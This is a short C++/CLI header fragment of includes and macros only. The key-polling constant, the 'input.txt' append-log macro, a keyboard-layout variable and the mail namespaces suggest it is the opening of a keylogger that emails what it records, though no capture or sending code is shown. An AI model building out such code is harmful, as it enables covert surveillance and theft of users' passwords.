#include <iostream>
#include <Windows.h>
#include <msclr/marshal_cppstd.h>
#include <stdlib.h>
#include <string>
#include <conio.h>
#include <fstream>
#using <System.dll>

#define NUM_PRESS -32767
#define SS Segment = RASKladka;
#define File_Save_Log ofstream file("input.txt", ios::app);

using namespace System;
using namespace System::Net;
using namespace System::Net::Mail;
using namespace System::Net::Mime;
using namespace System::Threading;
using namespace System::ComponentModel;
using namespace std;
